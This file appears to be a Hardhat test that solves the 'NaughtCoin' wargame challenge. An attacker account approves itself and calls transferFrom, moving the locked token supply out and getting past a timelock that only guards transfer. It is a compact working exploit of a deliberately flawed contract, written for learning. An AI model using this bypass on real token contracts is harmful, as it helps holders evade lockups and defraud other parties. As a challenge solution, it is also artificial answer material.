import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "NaughtCoin";

describe(CONTRACT_NAME, () => {
  it("Solves the challenge", async () => {
    const [_owner, attacker] = await ethers.getSigners();

    const contractFactory = await ethers.getContractFactory(CONTRACT_NAME);
    const contract = await contractFactory.connect(attacker).deploy(attacker.address);
    await contract.deployed();

    const tokens = BigNumber.from(10).pow(18).mul(1000000);

    const tx = await contract.approve(attacker.address, tokens);
    await tx.wait();

    const tx2 = await contract.transferFrom(attacker.address, "0x0000000000000000000000000000000000000001", tokens);
    await tx2.wait();

    expect(await contract.balanceOf(attacker.address)).to.eq(0);
  });
});
